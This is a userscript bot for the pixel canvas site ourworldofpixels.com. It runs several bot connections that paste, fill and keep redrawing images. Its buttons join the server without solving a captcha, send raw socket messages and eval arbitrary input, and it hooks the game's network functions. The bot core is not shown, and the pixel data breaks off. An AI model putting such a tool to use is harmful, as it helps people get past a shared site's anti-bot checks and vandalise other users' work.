// ==UserScript==
// @name        modded jbot
// @version     8.0.0
// @author      Autoplayer
// @description no info
// @include     https://ourworldofpixels.com/*
// @run-at      document-end
// @grant       none
// ==/UserScript==

function startinglol() {
function Brick() { }

if(sessionStorage.brick === "brick")
throw new Brick(sessionStorage.msg || '');


window.eval("(" + function main() {

var EVENTS = // V change this if they ever change the event numbers again
{
"loaded":6666667,"init":6666668,"tick":6666669,"misc":{"toolsRendered":6666670,"toolsInitialized":6666671,"logoMakeRoom":6666672,"worldInitialized":6666673,"windowAdded":6666674,"captchaToken":6666675},"renderer":{"addChunk":6666676,"rmChunk":6666677,"updateChunk":6666678},"camera":{"moved":6666679,"zoom":6666680},"net":{"connecting":6666681,"connected":6666682,"disconnected":6666683,"playerCount":6666684,"chat":6666685,"devChat":6666686,"world":{"leave":6666687,"join":6666688,"joining":6666689,"setId":6666690,"playersMoved":6666691,"playersLeft":6666692,"tilesUpdated":6666693,"teleported":6666694},"chunk":{"load":6666695,"unload":6666696,"set":6666697},"sec":{"rank":6666699}
}}
;

var BOTS = 5;

var countbot = BOTS;
var stoppingrandom = true;
var followmytool = true;
var changetools = 1;
var random1 = 0;
var random2 = 10;
var radiusing = 40;

var EMIT =
OWOP.emit // <-- change this if they change the name of the EventEmitter again
;

var ON =
OWOP.on // <-- change this if they would decide to change the name of EventEmitter.on for some retarded reason
;

var WORLD_VERIFICATION = OWOP.options.serverAddress[0].proto.misc.worldVerification;
/*// how to obtain:go to view-source:http://ourworldofpixels.com/ -> CTRL+F "app"(no quotes) click on it->CTRL+F "worldVerification"(no quotes) then copy the value after "worldVerification:" (without the comma).
4321 // <-- change this if the world verification code would get changed again.
;//1234*/

var TOKEN_VERIFICATION = OWOP.options.serverAddress[0].proto.misc.tokenVerification; // 'CaptchA'

var MODLOGIN = (OWOP.player.rank > 1) && prompt();//localStorage.getItem("modlogin");

var MOD = MODLOGIN && MODLOGIN.length;
var start;
var lolXD;
var botnext = 0;
var BUTTONS = [{
        value: "leave",
        call: function() {
            err("leaving");
            bots.leave();
        },
        title: "disconnects bot"
    }, {
        value: "join",
        call: function() {
            bots.joinWithoutCaptcha();//.join();
        },
        title: "connects bot when captcha is not enabled"
	}, {
        value: "protectimg",
	    call: function refreshData()
{
			bots.drawRawfast(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba")
			start = setTimeout(refreshData, 2000)
		},
        title: "protect the pasteimg"
    }, {
		        value: "unprotectimg",
	    call: function drefreshData()
{
			clearInterval(start);
		},
        title: "unprotect the pasteimg"
    }, {
        value: "protectfill",
	    call: function refreshfill()
{
			bots.drawRect(parseInt(params[0].value), parseInt(params[1].value),
                parseInt(params[2].value), parseInt(params[3].value), null);
			lolXD = setTimeout(refreshfill, 500)
		},
        title: "protect the fill"
    }, {
		        value: "unprotectfill",
	    call: function drefreshfill()
{
			clearInterval(lolXD);
		},
        title: "unprotect the fill"
    }, {
		value: "captcha-join",
		call: function() {
			bots.joinWithCaptcha();
		},
        title: "connects bot when captcha is enabled"
	}, {
        value: "stop",
        call: function() {
            bots.stop = true;
            bots.busy = false;
        },
        title: "stops bot's job"
    }, /*{
        value: "follow",
        call: function() {
			if (inter) {
				clearInterval(inter);
				return inter = null;
			}
			inter = setInterval(bots.follow, 100, protocol.id);
        },
        title: "bot will/won't follow you"
	},*/{
        value: "stop/start random",
        call: function() {
			if(stoppingrandom == false) {
				stoppingrandom = true
			} else {
				stoppingrandom = false
			}
        },
        title: "stops/starts bot's randoming cursor"
    },  {
        value: "stop/start my tool",
        call: function() {
			if(followmytool == false) {
				followmytool = true
			} else {
				followmytool = false
			}
        },
        title: "stops/starts bot's randoming cursor"
    },  {
        value: "change tool",
        call: function() {
            changetools = params[2].value
        },
        title: "selects tools bot's cursor\n0 - cursor,1 - move, 2 - Pipette, 3 - zoom"
    },  {
        value: "change random",
        call: function() {
            random1 = params[2].value
            random2 = params[3].value
        },
        title: "selects randoms tools bot's cursor"
    },  {
        value: "change rad",
        call: function() {
            radiusing = params[2].value
        },
        title: "selects radius follow"
    },  {
        value: "follow",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow, 50, protocol.id);
            FOLLOWADD = PI2 / 45
        },
        title: "bot will follow you"
    }, {
        value: "follow 1",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow1, 50, protocol.id);
            FOLLOWADD = PI2 / 500
        },
        title: "bot will follow you"
    }, {
        value: "follow 2",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow2, 50, protocol.id);
            FOLLOWADD = PI2 / 500
        },
        title: "bot will follow you"
    }, {
        value: "follow 3",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow3, 50, protocol.id);
            FOLLOWADD = PI2 / 300
        },
        title: "bot will follow you"
    }, {
        value: "follow 4",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow4, 100, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "follow 5",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow5, 50, protocol.id);
            FOLLOWADD = PI2 / 1500
        },
        title: "bot will follow you"
    }, {
        value: "follow 6",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow6, 50, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "follow 7",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow7, 50, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "follow 8",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow8, 50, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "follow 9",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow9, 50, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "follow 10",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow10, 100, protocol.id);
            FOLLOWADD = PI2 / 30
        },
        title: "bot will follow you"
    }, {
        value: "follow 11",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow11, 100, protocol.id);
            FOLLOWADD = PI2 / 30
        },
        title: "bot will follow you"
    }, {
        value: "follow 12",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow12, 100, protocol.id);
            FOLLOWADD = PI2 / 30
        },
        title: "bot will follow you"
    }, {
        value: "follow 13",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow13, 100, protocol.id);
            FOLLOWADD = PI2 / 30
        },
        title: "bot will follow you"
    }, {
        value: "follow 14",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow14, 100, protocol.id);
            FOLLOWADD = PI2 / 10
        },
        title: "bot will follow you"
    }, {
        value: "follow 15",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.follow15, 100, protocol.id);
            FOLLOWADD = PI2 / 30
        },
        title: "bot will follow you"
    }, {
        value: "unfollow",
        call: function() {
            clearInterval(inter);
        },
        title: "bot wont follow you"
    }, {
        value: "hide bots",
        call: function() {
            clearInterval(inter);
            inter = setInterval(bots.hidecursor, 100, protocol.id);
            FOLLOWADD = PI2 / 100
        },
        title: "bot will follow you"
    }, {
        value: "move",
        call: function() {
            bots.moveTo(parseInt(params[0].value), parseInt(params[1].value));
        },
        title: "moves bot cursors. params: x y"
    }, {
        value: "teleport",
        call: function() {
            tp(parseInt(params[0].value), parseInt(params[1].value));
        },
        title: "teleports you. params: x y"
    }, {
        value: "copy",
        call: function() {
            savePixels(select.start.x, select.start.y,
                select.end.x, select.end.y);
        },
        title: "copied pixels selected with B and N. You can also use Q"
    }, {
        value: "paste",
        call: function() {
            paste(parseInt(params[0].value), parseInt(params[1].value));
        },
        title: "pastes copied pixels. params: x y"
    }, {
        value: "fill",
        call: function() {
            bots.drawRect(parseInt(params[0].value), parseInt(params[1].value),
                parseInt(params[2].value), parseInt(params[3].value), null);
        },
        title: "fills area with selected color. params: x y width height"
    }, {
        value: "fast fill",
        call: function() {
            bots.fastarea(parseInt(params[0].value), parseInt(params[1].value),
                parseInt(params[2].value), parseInt(params[3].value), null);
        },
        title: "fills fast area with selected color. params: x y width height"
    }, {
        value: "write",
        call: function() {
            bots.writxt(params[2].value, parseInt(params[0].value), parseInt(params[1].value));
        },
        title: "writes text. params: x y text"
    }, {
        value: "downpasteImg",
        call: function() {
            bots.testdraw(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    },{
        value: "pasteImg",
        call: function() {
            bots.drawRaw(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pastebottomImg",
        call: function() {
            bots.drawRawbottom(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pastefastImg",
        call: function() {
            bots.drawRawfast(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pastepointImg",
        call: function() {
            bots.drawPoint(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pastelistrasImg",
        call: function() {
            bots.drawListras(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pasteSquaresImg",
        call: function() {
            bots.drawSquares(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
        value: "pasteRandomImg",
        call: function() {
            bots.drawRandom(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        },
        title: "pastes inmage."
    }, {
		value: "eval",
		call: function() {
			eval(params[0].value);
		},
		title: "runs code, m9"
	}, {
		value: "send message on 4 param",
		call: function() {
            if(botnext > countbot - 2) {botnext = 0}
			botnext++;
            console.log(botnext)
            bots[botnext].net.connection.send(params[3].value + String.fromCharCode(10))
		},
		title: "he sends bots message"
	}
];
document.body.onkeydown = function() {
    if (event.keyCode == 86 /*v*/ || event.keyCode == 81 /*Q*/ ) {
        bots.drawRawfast(parseInt(params[0].value), parseInt(params[1].value), pixelData.width, pixelData.height, pixelData, "rgba");
        return true;
    }
    if (event.keyCode == 188 /*,*/ ) {
        bots.fastarea(parseInt(params[0].value), parseInt(params[1].value), parseInt(params[2].value), parseInt(params[3].value), null);
        return true;
    }
    if (event.keyCode == 66 /*B*/ ) {
        params[0].value = select.start.x = getPlayerPos().x;
        params[1].value = select.start.y = getPlayerPos().y;
        return true;
    }
    if (event.keyCode == 78 /*N*/ ) {
        select.end.x = getPlayerPos().x;
        select.end.y = getPlayerPos().y;
        params[2].value = select.end.x - select.start.x + 1;
        params[3].value = select.end.y - select.start.y + 1;

        return true;
    }
};

document.querySelector('head').insertAdjacentHTML('beforeend',
	`<style type="text/css">
		#list-container{
		color:#000;
		font:12px consolas;
        position: relative;
        left: 0px;
        top: 0px;
        width: 190px;
      }
	  #list{
		flex-direction: column;
		height:150px;
		overflow: auto;
		border: 0.5px solid black;
      }
	  #bot-control {
        position: absolute;
        left: 200px;
        top: 0px;
        width: 400px;
        height: 50%;
		font:12px consolas;
		color:#000;
      }
	input[type=button],input[type=text],::-webkit-scrollbar-thumb,button {
    background-color: rgba(0,0,0,0.4);
    color: white;
	font:12px consolas;
	border: 0.2px solid rgba(200,200,200,0.7);
	text-shadow: -1px 0 #000, 0 1px #000, 1px 0 #000, 0 -1px #000;
	}

	input[type=button]:focus,input[type=text]:focus,
	#tool-select > button.selected{
    background-color: rgba(0,255,255,0.5);
	}

	input[type=button]:hover,input[type=text]:hover,
	::-webkit-scrollbar-thumb:hover,button:hover {
    background-color: #87CEFA;
	}


	::-webkit-scrollbar{
	width:10px;
	}
	</style>`
);
var container = document.createElement("div");
container.innerHTML = `<div id='hid' ></div>
	<div id="bot-control">
      <input id="param1" type="text" placeholder="x" onfocus="this.parentNode.className='active';">
	  <input id="param2" type="text" placeholder="y" onfocus="this.parentNode.className='active';">
	  <input id="param3" type="text" placeholder="width" onfocus="this.parentNode.className='active';">
	  <input id="param4" type="text" placeholder="height" onfocus="this.parentNode.className='active';">
	  <div id="buttons"></div>
    </div>`;
container.style = "width:0px;height:0px;position:absolute;top:0px;left:200px";
document.body.appendChild(container);
// document.body.onselectstart = function() { return false; }; //disables selecting text; y would u do dat, mait. its Möld
var selected = null;
var params = [];
for (var i = 0; i < 4; i++)
    params[i] = document.getElementById('param' + (i + 1));
var btns = document.getElementById("buttons");
//var list = document.getElementById('list');
//var listCont = document.getElementById('list-container');
var btnsCont = document.getElementById('bot-control');
var hbtn = document.createElement("input");
var tpbtn = document.createElement("input");
var fbtn = document.createElement("input");
hbtn.type = tpbtn.type = fbtn.type = "button";
hbtn.value = "hide all";
hbtn.title = "hides bot controls";
tpbtn.value = "teleport to";
tpbtn.title = "teleports you to selected player";
fbtn.value = "follow";
fbtn.title = "bot will follow selected player";
hbtn.onclick = function(e) {
    if (btnsCont.style.display == "none") {
        //listCont.style.display = "";
        btnsCont.style.display = "";
        this.value = "hide all";
    } else {
        //listCont.style.display = "none";
        btnsCont.style.display = "none";
        this.value = "show all";
    }
};

document.getElementById("hid").appendChild(hbtn);
/*
tpbtn.onclick = function(e) {
    port(selected);
};
document.getElementById("tp").appendChild(tpbtn);
fbtn.onclick = function(e) {
    clearInterval(inter);
    inter = setInterval(bots.follow, 100, selected);
};
document.getElementById("tp").appendChild(fbtn);*/

var protocol;

var _sendmsg = OWOP.options.serverAddress[0].proto.class.prototype.sendMessage;
OWOP.options.serverAddress[0].proto.class.prototype.sendMessage = function() {
	protocol = this;
	_sendmsg.apply(this, arguments);
}
OWOP.chat.send("".repeat(4096));

var _joinWorld = OWOP.options.serverAddress[0].proto.class.prototype.joinWorld;
OWOP.options.serverAddress[0].proto.class.prototype.joinWorld = function() {
	protocol = this;
	_joinWorld.apply(this, arguments);
}

function listUpdate() {
    if (list && OWOP) {
        list.innerHTML = "";
        list.onclick = function(e) {
            selItem(e);
        };
		var pple = ppl(), pid, pos, pstr, itm;
        for (var p in pple) {
            pid = pple[p].id; pos = getPos(pid);
            pstr = " Id: " + pid + " x:" + pos.x + " y:" + pos.y;
            itm = document.createElement("span");
            itm.id = pid;
            if (selected == pid)
                itm.innerHTML += "<font color='#14ba14'>" + pstr + " > Selected" + "</font>";
            else itm.innerHTML = pstr;
            list.appendChild(itm);
            list.insertAdjacentHTML('beforeend', "<br>");
        }
        list.insertAdjacentHTML('beforeend', "<font color='#F00'>" + " You: " + protocol.id + " x:" +
            (pos=getPlayerPos()).x + " y:" + pos.y + "</font><br>"); //player
    } else console.log("no list");
}

function selItem(e) {
    if (e.target.tagName == "SPAN")
        selected = e.target.id;
    else e.stopPropagation();
}

//protocol.chunksLoading = [];
OWOP.player.palette.push(new Uint8Array([255, 255, 255]));
/*var player = exports.player ======
    get paletteIndex() {
		return paletteIndex;
	},
	set paletteIndex(i) {
		paletteIndex = (0, _misc.absMod)(i, palette.length);
		updatePalette(); //!!!
	},
    [...]
  }*/
/*WorldOfPixels.updatePalette();*/
try{ OWOP.player.paletteIndex = OWOP.player.paletteIndex }catch(e){}
var chars = [
    [0b1111111, 0b1000001, 0b1010111, 0b1010100, 0b1010111, 0b1000001, 0b1111111] /*A*/ ,
    [0b1111111, 0b1000001, 0b1010101, 0b1010101, 0b1010101, 0b1001001, 0b1111111] /*B*/ ,
    [0b1111111, 0b1000001, 0b1011101, 0b1010101, 0b1010101, 0b1010101, 0b1110111] /*C*/ ,
    [0b1111111, 0b1000001, 0b1011101, 0b1010101, 0b1011101, 0b1100011, 0b0111110] /*D*/ ,
    [0b1111111, 0b1000001, 0b1010101, 0b1010101, 0b1010101, 0b1011101, 0b1110111] /*E*/ ,
    [0b1111111, 0b1000001, 0b1010111, 0b1010100, 0b1010100, 0b1011100, 0b1110000] /*F*/ ,
    [0b1111111, 0b1000001, 0b1011101, 0b1010101, 0b1010101, 0b1010001, 0b1111111] /*G*/ ,
    [0b1111111, 0b1000001, 0b1110111, 0b0010100, 0b1110111, 0b1000001, 0b1111111] /*H*/ ,
    [0b1111111, 0b1000001, 0b1111111] /*I*/ ,
    [0b1111111, 0b1010001, 0b1011101, 0b1010101, 0b1011101, 0b1000001, 0b1111111] /*J*/ ,
    [0b1111111, 0b1000001, 0b1110111, 0b0110110, 0b1101011, 0b1011101, 0b1110111] /*K*/ ,
    [0b1111111, 0b1000001, 0b1111101, 0b0000101, 0b0000101, 0b0000101, 0b0000111] /*L*/ ,
    [0b1111111, 0b1000001, 0b1011111, 0b1000001, 0b1011111, 0b1000001, 0b1111111] /*M*/ ,
    [0b1111111, 0b1000001, 0b1011111, 0b1000001, 0b1111101, 0b1000001, 0b1111111] /*N*/ ,
    [0b1111111, 0b1000001, 0b1011101, 0b1010101, 0b1011101, 0b1000001, 0b1111111] /*O*/ ,
    [0b1111111, 0b1000001, 0b1010111, 0b1010100, 0b1010100, 0b1000100, 0b1111100] /*P*/ ,
    [0b1111111, 0b1000001, 0b1011101, 0b1010101, 0b1011101, 0b1000011, 0b1111111] /*Q*/ ,
    [0b1111111, 0b1000001, 0b1010111, 0b1010100, 0b1010111, 0b1001001, 0b1111111] /*R*/ ,
    [0b1111111, 0b1000101, 0b1010101, 0b1010101, 0b1010101, 0b1010001, 0b1111111] /*S*/ ,
    [0b1110000, 0b1010000, 0b1011111, 0b1000001, 0b1011111, 0b1010000, 0b1110000] /*T*/ ,
    [0b1111111, 0b1000001, 0b1111101, 0b0000101, 0b1111101, 0b1000001, 0b1111111] /*U*/ ,
    [0b1111100, 0b1000110, 0b1111011, 0b0001101, 0b1111011, 0b1000110, 0b1111100] /*V*/ ,
    [0b1111110, 0b1000011, 0b1111101, 0b0100011, 0b1111101, 0b1000011, 0b1111110] /*W*/ ,
    [0b1110111, 0b1011101, 0b1101011, 0b0110110, 0b1101011, 0b1011101, 0b1110111] /*X*/ ,
    [0b1111000, 0b1001100, 0b1110111, 0b0011001, 0b1110111, 0b1001100, 0b1111000] /*Y*/ ,
    [0b1111111, 0b1010001, 0b1010101, 0b1010101, 0b1010101, 0b1000101, 0b1111111] /*Z*/ ,
];

var NUMS = [
    [0b11111, 0b10001, 0b11111] /*0*/ ,
    [0b01000, 0b11111] /*1*/ ,
    [0b10111, 0b10101, 0b11101] /*2*/ ,
    [0b10101, 0b10101, 0b11111] /*3*/ ,
    [0b11100, 0b00100, 0b11111] /*4*/ ,
    [0b11101, 0b10101, 0b10111] /*5*/ ,
    [0b11111, 0b10101, 0b10111] /*6*/ ,
    [0b10000, 0b10000, 0b11111] /*7*/ ,
    [0b11111, 0b10101, 0b11111] /*8*/ ,
    [0b11101, 0b10101, 0b11111] /*9*/
];

var symbols = {
    "33": [0b11101] /*!*/ ,
    "34": [0b11000, 0b00000, 0b11000] /*"*/ ,
    "35": [0b01010, 0b11111, 0b01010, 0b11111, 0b01010] /*#*/ ,
    "39": [0b11000] /*'*/ ,
    "40": [0b01110, 0b10001] /*(*/ ,
    "41": [0b10001, 0b01110] /*)*/ ,
    "43": [0b00100, 0b01110, 0b00100] /*+*/ ,
    "45": [0b00100, 0b00100, 0b00100] /*-*/ ,
    "46": [0b00001] /*.*/ ,
    "47": [0b00001, 0b00110, 0b11000] /*/*/ ,
    "58": [0b01010] /*:*/ ,
    "61": [0b01010, 0b01010, 0b01010] /*=*/ ,
    "63": [0b10101, 0b01000] /*?*/ ,
    "91": [0b11111, 0b10001] /*[*/ ,
    "93": [0b10001, 0b11111] /*]*/
};
//{
var tux_head = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 250, 250, 250, 255, 255, 255, 255, 255, 252, 252, 252, 255, 245, 245, 245, 255, 235, 235, 235, 255, 226, 226, 226, 255, 225, 225, 225, 255, 235, 235, 235, 255, 247, 247, 247, 255, 255, 255, 255, 255, 248, 248, 248, 255, 243, 243, 243, 255, 254, 254, 254, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 250, 250, 250, 255, 251, 251, 251, 255, 222, 222, 222, 255, 160, 160, 160, 255, 83, 83, 83, 255, 65, 65, 65, 255, 40, 40, 40, 255, 22, 22, 22, 255, 14, 14, 14, 255, 18, 18, 18, 255, 31, 31, 31, 255, 41, 41, 41, 255, 51, 51, 51, 255, 104, 104, 104, 255, 163, 163, 163, 255, 204, 204, 204, 255, 230, 230, 230, 255, 250, 250, 250, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 250, 250, 250, 255, 196, 196, 196, 255, 101, 101, 101, 255, 32, 32, 32, 255, 7, 7, 7, 255, 14, 14, 14, 255, 7, 7, 7, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 4, 4, 4, 255, 1, 1, 1, 255, 0, 0, 0, 255, 9, 9, 9, 255, 63, 63, 63, 255, 141, 141, 141, 255, 212, 212, 212, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 196, 196, 196, 255, 84, 84, 84, 255, 21, 21, 21, 255, 0, 0, 0, 255, 1, 1, 1, 255, 6, 6, 6, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 2, 2, 2, 255, 3, 3, 3, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 6, 6, 6, 255, 0, 0, 0, 255, 5, 5, 5, 255, 10, 10, 10, 255, 3, 3, 3, 255, 0, 0, 0, 255, 29, 29, 29, 255, 88, 88, 88, 255, 172, 172, 172, 255, 232, 232, 232, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 236, 236, 236, 255, 120, 120, 120, 255, 55, 55, 55, 255, 6, 6, 6, 255, 0, 0, 0, 255, 7, 7, 7, 255, 17, 17, 17, 255, 11, 11, 11, 255, 13, 13, 13, 255, 10, 10, 10, 255, 5, 5, 5, 255, 2, 2, 2, 255, 0, 0, 0, 255, 0, 0, 0, 255, 3, 3, 3, 255, 6, 6, 6, 255, 0, 0, 0, 255, 2, 2, 2, 255, 4, 4, 4, 255, 1, 1, 1, 255, 8, 8, 8, 255, 9, 9, 9, 255, 2, 2, 2, 255, 7, 7, 7, 255, 34, 34, 34, 255, 113, 113, 113, 255, 199, 199, 199, 255, 248, 248, 248, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 232, 232, 232, 255, 102, 102, 102, 255, 15, 15, 15, 255, 4, 4, 4, 255, 0, 0, 0, 255, 14, 14, 14, 255, 7, 7, 7, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 2, 2, 2, 255, 4, 4, 4, 255, 3, 3, 3, 255, 2, 2, 2, 255, 0, 0, 0, 255, 10, 10, 10, 255, 5, 5, 5, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 4, 4, 4, 255, 2, 2, 2, 255, 0, 0, 0, 255, 48, 48, 48, 255, 153, 153, 153, 255, 239, 239, 239, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 69, 69, 69, 255, 5, 5, 5, 255, 0, 0, 0, 255, 12, 12, 12, 255, 0, 0, 0, 255, 4, 4, 4, 255, 1, 1, 1, 255, 0, 0, 0, 255, 10, 10, 10, 255, 5, 5, 5, 255, 4, 4, 4, 255, 2, 2, 2, 255, 1, 1, 1, 255, 2, 2, 2, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 3, 3, 3, 255, 4, 4, 4, 255, 8, 8, 8, 255, 15, 15, 15, 255, 18, 18, 18, 255, 13, 13, 13, 255, 3, 3, 3, 255, 0, 0, 0, 255, 15, 15, 15, 255, 4, 4, 4, 255, 19, 19, 19, 255, 116, 116, 116, 255, 221, 221, 221, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 97, 97, 97, 255, 23, 23, 23, 255, 11, 11, 11, 255, 0, 0, 0, 255, 8, 8, 8, 255, 8, 8, 8, 255, 0, 0, 0, 255, 3, 3, 3, 255, 6, 6, 6, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 6, 6, 6, 255, 5, 5, 5, 255, 0, 0, 0, 255, 6, 6, 6, 255, 29, 29, 29, 255, 50, 50, 50, 255, 54, 54, 54, 255, 36, 36, 36, 255, 29, 29, 29, 255, 0, 0, 0, 255, 8, 8, 8, 255, 2, 2, 2, 255, 4, 4, 4, 255, 115, 115, 115, 255, 234, 234, 234, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 248, 248, 248, 255, 181, 181, 181, 255, 3, 3, 3, 255, 2, 2, 2, 255, 2, 2, 2, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 3, 3, 3, 255, 16, 16, 16, 255, 36, 36, 36, 255, 74, 74, 74, 255, 99, 99, 99, 255, 84, 84, 84, 255, 64, 64, 64, 255, 14, 14, 14, 255, 30, 30, 30, 255, 2, 2, 2, 255, 1, 1, 1, 255, 12, 12, 12, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 